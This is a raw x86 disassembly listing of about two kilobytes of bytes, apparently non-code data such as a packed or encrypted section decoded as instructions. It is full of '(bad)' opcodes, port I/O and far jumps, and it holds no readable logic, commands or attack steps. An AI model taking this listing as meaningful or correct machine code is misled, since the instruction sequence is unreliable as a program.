  405605:	cwde   
  405606:	mov    esi,0xb7b7728c
  40560b:	sahf   
  40560c:	sub    al,0x7c
  40560e:	ret    
  40560f:	(bad)  
  405610:	(bad)  
  405611:	sti    
  405612:	retf   0xaeed
  405615:	dec    ecx
  405616:	push   esp
  405617:	push   cs
  405618:	cmp    al,0xbc
  40561a:	test   al,0x1c
  40561c:	pop    esi
  40561d:	fsubr  DWORD PTR [edi+0x70cb5a1b]
  405623:	mov    eax,ds:0xf37e222c
  405628:	ins    BYTE PTR es:[edi],dx
  405629:	in     eax,0xca
  40562b:	out    0x5e,eax
  40562d:	sbb    eax,0x76e8b55d
  405632:	into   
  405633:	sub    al,BYTE PTR [esi+0x61]
  405636:	mov    DWORD PTR [ecx],ebx
  405638:	loop   0x4056b7
  40563a:	ss addr16 inc edx
  40563d:	(bad)  
  40563e:	out    dx,al
  40563f:	dec    esp
  405640:	aad    0x4a
  405642:	jmp    0xaca7:0xd5ff30aa
  405649:	ficomp DWORD PTR [edx-0x4f6f34ba]
  40564f:	xchg   esp,eax
  405650:	jg     0x40563b
  405652:	out    dx,al
  405653:	pop    ebx
  405654:	popf   
  405655:	dec    esi
  405656:	sahf   
  405657:	mov    ch,0x5d
  405659:	sub    eax,0x9333a220
  40565e:	inc    ebp
  40565f:	repnz mov edi,0x9b75288f
  405665:	push   edx
  405666:	out    0xc9,eax
  405668:	sbb    eax,0x30bfb342
  40566d:	int    0xa0
  40566f:	loope  0x405613
  405671:	test   al,0xaa
  405673:	mov    al,ds:0x8e418e5c
  405678:	sti    
  405679:	xchg   ebx,eax
  40567a:	xor    ah,BYTE PTR [edx]
  40567c:	pop    esi
  40567d:	push   eax
  40567e:	mov    dh,0xd6
  405680:	jge    0x405644
  405682:	add    eax,0x1abf605a
  405687:	mov    eax,ds:0x2fd68972
  40568c:	clc    
  40568d:	rcl    DWORD PTR [ebx-0x37],1
  405690:	pop    esi
  405691:	lahf   
  405692:	daa    
  405693:	(bad)  
  405694:	ds push es
  405696:	mov    dl,0xf3
  405698:	bound  ebx,QWORD PTR [edx+0x30]
  40569b:	outs   dx,BYTE PTR ds:[esi]
  40569c:	jb     0x4056e5
  40569e:	leave  
  40569f:	sbb    BYTE PTR [edi+0x5],0x55
  4056a3:	xor    DWORD PTR cs:[ebx+ecx*1+0x22],edi
  4056a8:	repnz fnstenv [ebx+0xf029d84]
  4056af:	and    al,0x8c
  4056b1:	mov    ecx,0x189c618e
  4056b6:	out    dx,al
  4056b7:	xchg   edx,eax
  4056b8:	sbb    BYTE PTR [esi-0x50c1f8b4],0xe1
  4056bf:	sahf   
  4056c0:	push   ds
  4056c1:	fistp  WORD PTR [edx]
  4056c3:	je     0x405743
  4056c5:	ret    
  4056c6:	mov    ebp,0xeeb1f4e6
  4056cb:	inc    esp
  4056cc:	cli    
  4056cd:	inc    ebx
  4056ce:	xchg   BYTE PTR [eax],bh
  4056d0:	push   edi
  4056d1:	mov    ds:0x3196a48b,eax
  4056d6:	in     al,dx
  4056d7:	jne    0x405723
  4056d9:	rcl    DWORD PTR [esi+0x34],1
  4056dc:	mov    esi,0x6820f0a4
  4056e1:	adc    eax,0x5256118
  4056e6:	jae    0x405724
  4056e8:	sar    DWORD PTR [esi+0x841ae87],1
  4056ee:	outs   dx,BYTE PTR ds:[esi]
  4056ef:	outs   dx,DWORD PTR ds:[esi]
  4056f0:	push   esi
  4056f1:	jge    0x4056a9
  4056f3:	stos   DWORD PTR es:[edi],eax
  4056f4:	inc    edi
  4056f5:	mov    eax,0xe11706ef
  4056fa:	mov    esp,0x436943a0
  4056ff:	sbb    eax,0xa15ec86e
  405704:	cdq    
  405705:	stos   DWORD PTR es:[edi],eax
  405706:	mov    al,0x89
  405708:	pop    es
  405709:	ins    BYTE PTR es:[edi],dx
  40570a:	fidiv  DWORD PTR [esi+ebx*2-0x4073de7f]
  405711:	int    0x90
  405713:	adc    eax,0x7d67606f
  405718:	pop    ecx
  405719:	test   eax,0x4ec0331b
  40571e:	in     eax,dx
  40571f:	adc    DWORD PTR [edx+0x3d],eax
  405722:	push   esp
  405723:	sub    edx,ecx
  405725:	jnp    0x405755
  405727:	pop    ebp
  405728:	loop   0x40578a
  40572a:	cmp    DWORD PTR [ebx+0x4e],ebx
  40572d:	loop   0x405734
  40572f:	pop    eax
  405730:	push   eax
  405731:	inc    edx
  405732:	jle    0x40574a
  405734:	push   esp
  405735:	mov    bl,0x84
  405737:	call   FWORD PTR [esi+0x5f7ac49f]
  40573d:	inc    eax
  40573e:	into   
  40573f:	mov    al,ds:0x7cad2394
  405744:	sub    eax,DWORD PTR [edi-0x4eab76c7]
  40574a:	push   cs
  40574b:	ins    BYTE PTR es:[edi],dx
  40574c:	and    al,0x3c
  40574e:	sti    
  40574f:	loopne 0x405794
  405751:	es xchg esi,eax
  405753:	adc    BYTE PTR [esi+0x7054ec5d],0xc3
  40575a:	addr16 or al,0xde
  40575d:	call   0x77b3:0x7d5e4195
  405764:	add    bh,bl
  405766:	pop    ebx
  405767:	enter  0x51ca,0x99
  40576b:	push   es
  40576c:	mov    dl,ah
  40576e:	dec    esi
  40576f:	and    al,0xe2
  405771:	and    al,0x14
  405773:	fstp   QWORD PTR [esi-0x3e]
  405776:	sti    
  405777:	leave  
  405778:	mul    bh
  40577a:	jo     0x4057f6
  40577c:	and    DWORD PTR [eax-0x5c],0x3a8c02a9
  405783:	cli    
  405784:	jge    0x4057fd
  405786:	out    dx,al
  405787:	and    eax,0x6b56d387
  40578c:	push   eax
  40578d:	mov    edx,0x3bd5a0c6
  405792:	and    esp,DWORD PTR [edi+0x1b88bf4f]
  405798:	pop    esi
  405799:	je     0x4057d1
  40579b:	add    al,ah
  40579d:	mov    ah,0x1f
  40579f:	xor    eax,0x8eac5a57
  4057a4:	pop    ebx
  4057a5:	icebp  
  4057a6:	dec    edi
  4057a7:	xor    DWORD PTR [edx+ebp*4],esi
  4057aa:	push   ecx
  4057ac:	ins    BYTE PTR es:[edi],dx
  4057ad:	push   es
  4057ae:	cmc    
  4057af:	addr16 hlt 
  4057b1:	push   ecx
  4057b2:	and    DWORD PTR [ecx],esp
  4057b4:	dec    eax
  4057b5:	hlt    
  4057b6:	and    al,0x9d
  4057b8:	dec    edx
  4057b9:	popa   
  4057ba:	jp     0x4057b2
  4057bc:	stos   DWORD PTR es:[edi],eax
  4057bd:	ja     0x40578e
  4057bf:	pop    eax
  4057c0:	sub    ah,BYTE PTR [edi+0x64bed123]
  4057c6:	test   eax,0xdaed4820
  4057cb:	jg     0x405793
  4057cd:	adc    eax,0x1831a127
  4057d2:	dec    eax
  4057d3:	mov    al,ds:0xcd2038f2
  4057d8:	pop    esi
  4057d9:	imul   ecx,ecx,0x748ff7c3
  4057df:	xchg   ecx,eax
  4057e0:	into   
  4057e1:	mov    al,0xd5
  4057e3:	lahf   
  4057e4:	call   0xc89b:0xde54c130
  4057eb:	call   0xff2eaef0
  4057f0:	ret    0xe8f0
  4057f3:	int3   
  4057f4:	mov    bl,0x44
  4057f6:	dec    edi
  4057f7:	mov    eax,ds:0x1698877c
  4057fc:	enter  0xabfb,0x76
  405800:	pop    esi
  405801:	sub    ah,BYTE PTR [esi-0x61dfeb56]
  405807:	mov    edi,0x279f60f6
  40580c:	sbb    ch,dl
  40580e:	and    DWORD PTR [edi-0x60214b45],ecx
  405814:	pop    esi
  405815:	sub    al,0xb
  405817:	fwait
  405818:	mov    ?,WORD PTR [edi+eiz*1]
  40581b:	sub    eax,DWORD PTR [ecx+0x60]
  40581e:	cmp    eax,0x773ba6cb
  405823:	sub    ch,BYTE PTR [ebx-0x5c]
  405826:	pop    eax
  405827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405828:	pop    ebx
  405829:	(bad)  
  40582a:	rol    BYTE PTR [esi-0x30],0x5a
  40582e:	in     al,dx
  40582f:	jge    0x405830
  405831:	rcr    ch,0x10
  405834:	jp     0x405865
  405836:	pop    edx
  405837:	mov    eax,ds:0x29ad2bb0
  40583c:	sub    edi,DWORD PTR ds:0xe75e30dc
  405842:	mov    WORD PTR [ecx-0x41bc2167],ss
  405848:	and    eax,0x4b06fc61
  40584d:	out    dx,al
  40584e:	push   ebp
  40584f:	adc    al,0x8f
  405851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405852:	out    dx,al
  405853:	sub    esp,DWORD PTR [ebp+0x4b]
  405856:	or     edx,DWORD PTR ds:0xa16681b8
  40585c:	push   0xffffff92
  40585e:	add    eax,0x74dd20a0
  405863:	mov    edx,0x4f4ece5d
  405868:	jo     0x40583e
  40586a:	sub    DWORD PTR [eax],0x1e
  40586d:	ror    ah,1
  40586f:	push   0xffffffb8
  405871:	pusha  
  405872:	mov    edx,esp
  405874:	fimul  DWORD PTR [ebp+0xbf51af5]
  40587a:	out    dx,al
  40587b:	cmc    
  40587c:	adc    edi,DWORD PTR [edx-0x1a]
  40587f:	mov    al,0xee
  405881:	mov    edi,0xa87ca117
  405886:	add    ch,BYTE PTR [ebx+0x40]
  405889:	dec    ebx
  40588a:	cli    
  40588b:	(bad)  
  40588c:	pop    ebp
  40588d:	push   eax
  40588e:	dec    edx
  40588f:	push   0xffffff99
  405891:	repnz inc edx
  405893:	out    0xe,al
  405895:	sar    BYTE PTR [ebx+0x3e],0xda
  405899:	pusha  
  40589a:	clc    
  40589b:	(bad)  
  40589c:	pop    eax
  40589d:	push   0xdfc2ce88
  4058a2:	clc    
  4058a3:	cmp    DWORD PTR [esi],eax
  4058a5:	sbb    al,0xee
  4058a7:	push   edi
  4058a8:	cld    
  4058a9:	stc    
  4058aa:	iret   
  4058ab:	pop    edi
  4058ac:	push   esi
  4058ad:	ror    DWORD PTR [ebp-0x5f],1
  4058b0:	mov    al,0xa6
  4058b2:	retf   0x1c0e
  4058b5:	cmp    cl,0xd3
  4058b8:	push   ss
  4058b9:	jmp    0x405873
  4058bb:	repz push edx
  4058bd:	shr    DWORD PTR [eax+ebx*4-0x22],cl
  4058c1:	iret   
  4058c2:	mov    eax,ds:0x1a6e52d2
  4058c7:	mov    eax,ds:0x7bfe93c2
  4058cc:	ja     0x40589f
  4058ce:	test   ecx,ebx
  4058d0:	pop    esi
  4058d1:	icebp  
  4058d2:	daa    
  4058d3:	jo     0x40588f
  4058d5:	in     al,0x30
  4058d7:	imul   esi,DWORD PTR [ecx],0x7d
  4058da:	xorps  xmm1,XMMWORD PTR [ebp-0x5f72919e]
  4058e1:	cmc    
  4058e2:	mov    dl,bl
  4058e4:	pop    edi
  4058e5:	mov    ch,0xf0
  4058e7:	sbb    dl,al
  4058e9:	push   ds
  4058ea:	repnz iret 
  4058ec:	jecxz  0x40588a
  4058ee:	cmp    eax,DWORD PTR [ecx-0x29a724fa]
  4058f4:	repnz sub eax,0x4baca0ea
  4058fa:	and    DWORD PTR [edi-0x11],edi
  4058fd:	push   eax
  4058fe:	ret    0x325b
  405901:	fimul  DWORD PTR [ecx+0x21]
  405904:	ret    
  405905:	in     eax,0x86
  405907:	push   ebx
  405908:	add    eax,0x2ba0cf48
  40590d:	adc    eax,0xdc544316
  405912:	test   BYTE PTR [ecx+0x35],0x11
  405916:	and    BYTE PTR [eax],ah
  405918:	pop    edi
  405919:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40591a:	cmp    cl,ah
  40591c:	dec    ebx
  40591d:	lods   eax,DWORD PTR ds:[esi]
  40591e:	mov    dh,0xe4
  405920:	sub    bh,BYTE PTR [bp+si-0x2c60]
  405925:	loope  0x405951
  405927:	cmp    BYTE PTR [edx+0x5e6afb22],ah
  40592d:	rcl    dh,cl
  40592f:	daa    
  405930:	fstp   QWORD PTR [ebx+0x62]
  405933:	(bad)  
  405935:	popa   
  405936:	add    DWORD PTR [ebx-0x29],ecx
  405939:	fst    QWORD PTR [eax+0x2]
  40593c:	test   ecx,eax
  40593e:	out    dx,al
  40593f:	xor    al,0x9b
  405941:	jne    0x40597d
  405943:	or     ebx,esp
  405945:	mul    BYTE PTR [esi-0xf289d58]
  40594b:	xor    BYTE PTR [eax+0x20],0x33
  40594f:	sbb    DWORD PTR [ecx+0x1d],eax
  405952:	push   esi
  405953:	xacquire xchg BYTE PTR [eax],dh
  405956:	out    dx,al
  405957:	adc    al,0x6e
  405959:	jecxz  0x40595f
  40595b:	or     al,0xa5
  40595d:	push   ecx
  40595e:	xchg   ebp,eax
  40595f:	mov    eax,ds:0xcc6ee577
  405964:	xchg   edx,eax
  405965:	xchg   esi,eax
  405966:	int3   
  405967:	dec    ebx
  405968:	and    ah,BYTE PTR [edx+0x51]
  40596b:	mov    eax,ds:0xe3212850
  405970:	push   ss
  405971:	bnd jb 0x405915
  405974:	mov    ds:0xfafd1230,eax
  405979:	mov    ebx,0xbd5e60f8
  40597e:	or     edx,ebx
  405980:	in     eax,0x77
  405982:	push   0x4e
  405984:	mov    eax,0xdafb360
  405989:	mov    bh,0xe
  40598b:	pushf  
  40598c:	scas   eax,DWORD PTR es:[edi]
  40598d:	jno    0x40597c
  40598f:	ror    BYTE PTR [edx],cl
  405991:	test   eax,0xa0d12405
  405996:	dec    esi
  405997:	mov    esp,0x54460e0
  40599c:	aaa    
  40599d:	xor    bl,dl
  40599f:	int3   
  4059a0:	push   ss
  4059a1:	(bad)  
  4059a2:	adc    BYTE PTR [esi-0x7811e62b],bl
  4059a8:	sbb    al,0x78
  4059aa:	add    DWORD PTR ds:[ecx],0x5a
  4059ae:	inc    ebx
  4059af:	(bad)  
  4059b0:	jb     0x4059f8
  4059b2:	cmc    
  4059b3:	loopne 0x4059e2
  4059b5:	mov    eax,0xf35e1dfd
  4059ba:	fdivr  DWORD PTR [edx]
  4059bc:	add    al,0x8
  4059be:	pop    ecx
  4059bf:	cmp    BYTE PTR [ebx+0x1ac69c60],ah
  4059c5:	pop    eax
  4059c6:	mov    dl,bl
  4059c8:	cmp    al,0xe4
  4059ca:	out    dx,al
  4059cb:	out    0x21,al
  4059cd:	sbb    DWORD PTR [eax],esp
  4059cf:	inc    eax
  4059d0:	jnp    0x4059e2
  4059d2:	dec    edi
  4059d3:	mov    eax,ds:0xeecc4a9f
  4059d8:	xchg   DWORD PTR [ecx-0x2f],ebp
  4059db:	xchg   ecx,eax
  4059dc:	pop    esi
  4059dd:	dec    edi
  4059de:	sbb    al,0xea
  4059e0:	mov    eax,ds:0x242a87ac
  4059e5:	push   ebx
  4059e6:	cmc    
  4059e7:	mov    ebx,0x9d6e8b22
  4059ec:	adc    eax,0x5e980c0d
  4059f1:	dec    esi
  4059f2:	adc    al,0x66
  4059f4:	push   edx
  4059f5:	mov    eax,0xb4f31a50
  4059fa:	jecxz  0x4059c4
  4059fc:	std    
  4059fd:	hlt    
  4059fe:	in     eax,dx
  4059ff:	xor    cl,BYTE PTR [edi+ecx*1]
  405a02:	shl    DWORD PTR [ecx-0x3a95629b],0xd6
  405a09:	fldz   
  405a0b:	mov    ah,0x6c
  405a0d:	ins    DWORD PTR es:[edi],dx
  405a0e:	in     eax,0x8d
  405a10:	popa   
  405a11:	xor    BYTE PTR cs:[ecx-0x7ec5aa2d],ah
  405a18:	inc    edi
  405a19:	sbb    al,0x9f
  405a1b:	inc    edi
  405a1c:	pop    edi
  405a1d:	xor    ebp,DWORD PTR [esi+ebp*8-0x29]
  405a21:	sub    al,BYTE PTR [ecx-0x76b79697]
  405a27:	fwait
  405a28:	jns    0x405a67
  405a2a:	mov    dh,0x6a
  405a2c:	call   0x7f1bd591
  405a31:	iret   
  405a32:	mov    dl,BYTE PTR [eax+0x5e]
  405a35:	jmp    0x4059fe
  405a37:	jnp    0x4059d7
  405a39:	outs   dx,BYTE PTR ds:[esi]
  405a3a:	xchg   edi,eax
  405a3b:	enter  0x52cc,0xb5
  405a3f:	(bad)  
  405a41:	adc    eax,0x8469710e
  405a46:	mov    ds:0xdaaf5ef7,eax
  405a4b:	jns    0x405a12
  405a4d:	jnp    0x405ac4
  405a4f:	push   ss
  405a50:	pop    edi
  405a51:	popa   
  405a52:	jo     0x405a6b
  405a54:	push   ebx
  405a55:	(bad)  
  405a56:	stos   DWORD PTR es:[edi],eax
  405a57:	loope  0x405a00
  405a59:	adc    dh,ch
  405a5b:	cmp    cl,dh
  405a5d:	dec    edx
  405a5e:	stos   BYTE PTR es:[edi],al
  405a5f:	cwde   
  405a60:	rol    BYTE PTR [esi+0x0],0xa1
  405a64:	dec    ecx
  405a65:	jmp    0x405a8c
  405a67:	and    ah,BYTE PTR [ecx]
  405a69:	icebp  
  405a6a:	ror    BYTE PTR [edi+0x7c],1
  405a6d:	xor    ebp,ebp
  405a6f:	idiv   DWORD PTR [edx-0x4b5294b1]
  405a75:	pushf  
  405a76:	dec    esp
  405a77:	xor    DWORD PTR [ebx+0x229fe49b],0x1b7fa180
  405a81:	in     al,dx
  405a82:	scas   eax,DWORD PTR es:[edi]
  405a83:	push   eax
  405a84:	out    0x88,al
  405a86:	or     bh,dl
  405a88:	pop    esi
  405a89:	retf   0x334f
  405a8c:	cmp    bh,bh
  405a8e:	das    
  405a8f:	jns    0x405aa2
  405a91:	repnz mov al,es:0x3caf9ea5
  405a98:	adc    cl,BYTE PTR [edx+edx*8+0x7f7464e5]
  405a9f:	js     0x405a8f
  405aa1:	mov    al,ds:0x461c19e8
  405aa6:	cli    
  405aa7:	mov    al,ds:0x2bddad1d
  405aac:	scas   eax,DWORD PTR es:[edi]
  405aad:	pop    ebp
  405aae:	aaa    
  405aaf:	(bad)  
  405ab0:	push   ecx
  405ab1:	mov    ds,WORD PTR [edi+0x76]
  405ab4:	arpl   WORD PTR [eax*4-0x63709f9f],si
  405abb:	je     0x405aef
  405abd:	popa   
  405abe:	jp     0x405b0d
  405ac0:	cs popf 
  405ac2:	imul   DWORD PTR [edi+0x4c]
  405ac5:	mov    esp,0xb36998ee
  405aca:	jns    0x405aae
  405acc:	and    al,dl
  405ace:	or     ah,BYTE PTR [ecx-0x25a10a1a]
  405ad4:	fsubr  QWORD PTR [edi]
  405ad6:	(bad)  
  405ad7:	popf   
  405ad8:	xor    al,BYTE PTR [ebx-0x168ede91]
  405ade:	sbb    al,0x4
  405ae0:	loop   0x405ad2
  405ae2:	sub    esp,DWORD PTR [ecx+0x435fe16a]
  405ae8:	gs sar esp,1
  405aeb:	leave  
  405aec:	xchg   DWORD PTR [eax-0x3dac78ac],esp
  405af2:	scas   eax,DWORD PTR es:[edi]
  405af3:	scas   eax,DWORD PTR es:[edi]
  405af4:	fidiv  WORD PTR [esi+ebx*2]
  405af7:	fidivr WORD PTR [esi+0x20a0132b]
  405afd:	lods   eax,DWORD PTR ds:[esi]
  405afe:	mov    ds:0xbca07e63,al
  405b03:	pop    ecx
  405b04:	xor    edi,DWORD PTR [ebx]
  405b06:	out    dx,al
  405b07:	(bad)  
  405b08:	add    ebx,DWORD PTR [ecx]
  405b0a:	mov    ch,0x95
  405b0c:	and    DWORD PTR [ecx+0x1c2d92f0],ecx
  405b12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b13:	mov    ds:0x8bd069e3,al
  405b18:	bound  esi,QWORD PTR [ecx+0x3]
  405b1b:	push   ecx
  405b1c:	pop    esi
  405b1d:	inc    edx
  405b1e:	xor    ah,bh
  405b20:	retf   0x9bf3
  405b23:	imul   esi,DWORD PTR [eax-0x52efe78c],0x60
  405b2a:	loope  0x405b1e
  405b2c:	out    dx,al
  405b2d:	sub    BYTE PTR [ebx],dh
  405b2f:	scas   eax,DWORD PTR es:[edi]
  405b30:	repnz loopne 0x405b25
  405b33:	dec    edx
  405b34:	mov    ds:0x545ef438,al
  405b39:	popa   
  405b3a:	or     eax,0x64a8c9fd
  405b3f:	outs   dx,DWORD PTR ds:[esi]
  405b40:	push   ss
  405b41:	fldz   
  405b43:	popf   
  405b44:	xchg   BYTE PTR gs:[ebx+eax*8-0x5ece6d3f],ah
  405b4c:	cli    
  405b4d:	daa    
  405b4e:	jnp    0x405b76
  405b50:	mov    ebp,0x641dd91a
  405b55:	sub    dl,BYTE PTR [esi+0xd]
  405b58:	repnz and BYTE PTR [ebp-0x40],dl
  405b5c:	adc    al,0xd3
  405b5e:	sub    eax,0x2ceaeda2
  405b63:	inc    esp
  405b64:	adc    eax,0xa485586a
  405b69:	mov    ah,0x58
  405b6b:	pop    eax
  405b6c:	je     0x405b43
  405b6e:	out    dx,al
  405b6f:	mov    esi,0xea41109b
  405b74:	xchg   esp,eax
  405b75:	cmp    DWORD PTR [ebx-0x5f],0x248f53a5
  405b7c:	push   ebx
  405b7d:	pop    edi
  405b7e:	shl    DWORD PTR [ebx+0x5b],0x88
  405b82:	js     0x405b16
  405b84:	xchg   edx,eax
  405b85:	dec    ebp
  405b86:	fdivp  st(5),st
  405b88:	jnp    0x405baa
  405b8a:	sub    BYTE PTR [eax+0x2463725d],0x9c
  405b91:	nop
  405b92:	dec    ebx
  405b93:	ret    
  405b94:	nop
  405b95:	call   0x6888a488
  405b9a:	fs jp  0x405bc5
  405b9d:	loope  0x405bb9
  405b9f:	nop
  405ba0:	repnz aaa 
  405ba2:	inc    edx
  405ba3:	popa   
  405ba4:	ret    
  405ba5:	xor    al,0x5f
  405ba7:	add    DWORD PTR [edi+eiz*8],esi
  405baa:	out    dx,al
  405bab:	xchg   edx,eax
  405bac:	idiv   BYTE PTR [edx]
  405bae:	(bad)  
  405baf:	pushf  
  405bb0:	jne    0x405c29
  405bb2:	cmp    ah,BYTE PTR [ecx+0x73cfdc2f]
  405bb8:	(bad)  
  405bb9:	and    eax,0x1f5ea1c7
  405bbe:	xchg   edi,eax
  405bbf:	sbb    eax,0xbb1181da
  405bc4:	xchg   edx,eax
  405bc5:	pop    ebp
  405bc6:	enter  0xf168,0xa2
  405bca:	cmp    ah,BYTE PTR [ebp-0x42]
  405bcd:	xor    al,0x77
  405bcf:	pop    ebx
  405bd0:	jp     0x405b92
  405bd2:	out    dx,al
  405bd3:	sti    
  405bd4:	jno    0x405bba
  405bd6:	or     eax,0xb14217ff
  405bdb:	sahf   
  405bdc:	out    0x37,eax
  405bde:	cld    
  405bdf:	fdiv   st(6),st
  405be1:	mov    bh,BYTE PTR [edi+0x5]
  405be4:	repz (bad) 
  405be6:	out    dx,al
  405be7:	lea    ebp,[esi+eax*1+0x411f060a]
  405bee:	call   0xedd3fa93
  405bf3:	or     dh,ch
  405bf5:	hlt    
  405bf6:	int    0x95
  405bf8:	xchg   BYTE PTR [esi+0xec56fee],dh
  405bfe:	pop    ss
  405bff:	cli    
  405c00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c01:	(bad)  
  405c02:	daa    
  405c03:	test   al,0xa9
  405c05:	mov    eax,0xf1069d87
  405c0a:	pop    ecx
  405c0b:	push   ss
  405c0c:	sbb    DWORD PTR [edi-0x6fa1141f],0xffffffa1
  405c13:	out    dx,al
  405c14:	xchg   ecx,eax
  405c15:	or     edi,DWORD PTR [esi+0x3160ebf3]
  405c1b:	sub    eax,0x504b80ed
  405c20:	sub    BYTE PTR [ecx+0x887dbee],ch
  405c26:	gs mov edi,0xa129dca3
  405c2c:	sbb    BYTE PTR [ecx+edx*2+0x7242deca],al
  405c33:	out    0x5e,al
  405c35:	stos   BYTE PTR es:[edi],al
  405c36:	enter  0x71bb,0xc6
  405c3a:	jecxz  0x405bfc
  405c3c:	mov    al,0x2b
  405c3e:	pop    edx
  405c3f:	mov    eax,ds:0xe9cdb4d5
  405c44:	add    ch,cl
  405c46:	leave  
  405c47:	push   es
  405c48:	pop    edi
  405c49:	call   0xd76c39b3
  405c4e:	stos   DWORD PTR es:[edi],eax
  405c4f:	jnp    0x405c22
  405c51:	clc    
  405c52:	and    bl,cl
  405c54:	int    0x5b
  405c56:	mov    DWORD PTR [esi],edi
  405c58:	in     al,dx
  405c59:	arpl   di,cx
  405c5b:	and    BYTE PTR [ebx+0x34],bl
  405c5e:	addr16 mov ch,0x5e
  405c61:	icebp  
  405c62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c63:	add    esp,ecx
  405c65:	push   ss
  405c66:	push   es
  405c67:	pop    edx
  405c68:	fbld   TBYTE PTR [eax-0x28]
  405c6b:	outs   dx,BYTE PTR ds:[esi]
  405c6c:	sub    al,0x71
  405c6e:	call   0xf12f168e
  405c73:	imul   eax,DWORD PTR [edx+0x357ee45c],0xffffffa1
  405c7a:	es sbb eax,0xaec1acb7
  405c80:	push   eax
  405c81:	xchg   BYTE PTR [ebx-0x2],ch
  405c84:	fidivr DWORD PTR [ebp+0x6963546b]
  405c8a:	into   
  405c8b:	mov    esp,0x8d7120c8
  405c90:	add    al,0x89
  405c92:	inc    ebp
  405c93:	mov    eax,ds:0x8a1598aa
  405c98:	inc    esp
  405c99:	(bad)  
  405c9b:	mov    bl,BYTE PTR [esi-0x26]
  405c9e:	pushf  
  405c9f:	pop    ebx
  405ca0:	and    al,0x1d
  405ca2:	sar    DWORD PTR [eax-0x11],0x60
  405ca6:	cdq    
  405ca7:	cwde   
  405ca8:	js     0x405c7c
  405caa:	shl    dl,cl
  405cac:	lahf   
  405cad:	sar    DWORD PTR [esi-0x11a76d39],cl
  405cb3:	mov    ds:0x824656a2,eax
  405cb8:	outs   dx,DWORD PTR ds:[esi]
  405cb9:	sbb    eax,0xb87ca111
  405cbe:	in     al,0xca
  405cc0:	adc    bh,0x3f
  405cc3:	sbb    BYTE PTR [esi-0x64],dh
  405cc6:	jmp    0x405cf6
  405cc8:	or     eax,0xb6e15a96
  405ccd:	add    BYTE PTR [edi],dl
  405ccf:	test   eax,0x30db60e4
  405cd4:	retf   0xe75e
  405cd7:	and    al,0xf5
  405cd9:	stc    
  405cda:	out    dx,al
  405cdb:	das    
  405cdc:	shl    DWORD PTR [ebx+0x497daf17],cl
  405ce2:	lds    esp,FWORD PTR [eax+0x27794001]
  405ce8:	inc    eax
  405ce9:	loope  0x405c74
  405ceb:	push   es
  405cec:	pop    esi
  405ced:	cwde   
  405cee:	ret    0x5b2c
  405cf1:	ficomp DWORD PTR [ecx+edi*1-0x1e]
  405cf5:	sub    ch,BYTE PTR [eax+0x7d45a98f]
  405cfb:	loope  0x405d78
  405cfd:	xchg   esp,eax
  405cfe:	jg     0x405cbd
  405d00:	xor    eax,0xd8f0ee63
  405d05:	dec    ebp
  405d06:	js     0x405cd2
  405d08:	stc    
  405d09:	dec    edi
  405d0a:	xchg   DWORD PTR [ecx+0xd29407a],esp
  405d10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d11:	daa    
  405d12:	ror    BYTE PTR [eax],0x5e
  405d15:	mov    edi,0x79f77bbc
  405d1a:	jl     0x405ca0
  405d1c:	repz pusha 
  405d1e:	push   esp
  405d1f:	leave  
  405d20:	cwde   
  405d21:	and    al,0x4
  405d23:	sbb    ah,BYTE PTR [edx+ebx*1+0x753293ee]
  405d2a:	lock shr BYTE PTR [edi],0x66
  405d2e:	outs   dx,BYTE PTR ds:[esi]
  405d2f:	mov    ds:0xcbc0ac07,al
  405d34:	jp     0x405d63
  405d36:	adc    esp,DWORD PTR [ebp-0x1a]
  405d39:	cmp    esi,ebp
  405d3b:	outs   dx,DWORD PTR ds:[esi]
  405d3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d3d:	clc    
  405d3e:	daa    
  405d3f:	jmp    0x41e8:0xa7dd1801
  405d46:	sub    eax,0xa2b10215
  405d4b:	daa    
  405d4c:	dec    eax
  405d4d:	popf   
  405d4e:	out    0xe,eax
  405d50:	fbstp  TBYTE PTR ds:0xc7ded8fd
  405d56:	mov    esp,DWORD PTR [edx]
  405d58:	cmp    eax,0xa4a3dcf1
  405d5d:	outs   dx,DWORD PTR ds:[esi]
  405d5e:	fsubr  QWORD PTR [ebx-0x7b61e588]
  405d64:	inc    edi
  405d65:	mov    ah,0xee
  405d67:	mov    al,0xbe
  405d69:	data16 (bad) 
  405d6b:	out    dx,eax
  405d6c:	xchg   esp,eax
  405d6d:	push   esp
  405d6e:	jg     0x405d14
  405d70:	add    BYTE PTR [edx+0x64fe234a],cl
  405d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d77:	(bad)  
  405d78:	mov    ecx,0x60cce591
  405d7d:	out    dx,al
  405d7e:	pop    ds
  405d7f:	jmp    0xdc3f:0x123db29
  405d86:	cli    
  405d87:	mov    al,ds:0x8191986b
  405d8c:	jne    0x405dc7
  405d8e:	mov    WORD PTR [ebx+ebx*2],cs
  405d91:	test   eax,0x12dbb18
  405d96:	inc    ecx
  405d97:	popa   
  405d98:	bound  esp,QWORD PTR [eax-0x2e]
  405d9b:	rol    DWORD PTR [ecx+ebx*2-0x486a7a6b],1
  405da2:	mov    al,ds:0xbfbb37e1
  405da7:	mov    ebp,0x3d763664
  405dac:	inc    edx
  405dad:	popa   
  405dae:	out    0xa9,eax
  405db0:	dec    edi
  405db1:	aas    
  405db2:	or     esp,DWORD PTR [ecx+0x1e988cdd]
  405db8:	fwait
  405db9:	or     DWORD PTR [ecx+0x27],eax
  405dbc:	outs   dx,BYTE PTR ds:[esi]
  405dbd:	dec    edi
  405dbe:	out    dx,al
  405dbf:	mov    ecx,0x3c54c684
  405dc4:	mov    ss,WORD PTR [ecx-0x7e885edd]
  405dca:	js     0x405e3a
  405dcc:	in     eax,dx
  405dcd:	pop    esi
  405dce:	mov    dh,0xc6
  405dd0:	pop    esi
  405dd1:	push   edi
  405dd2:	pop    ebp
  405dd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dd4:	xchg   esp,eax
  405dd5:	xchg   ebp,eax
  405dd6:	mov    ?,WORD PTR [ecx]
  405dd8:	xchg   edi,eax
  405dd9:	pusha  
  405dda:	mov    al,0x78
  405ddc:	daa    
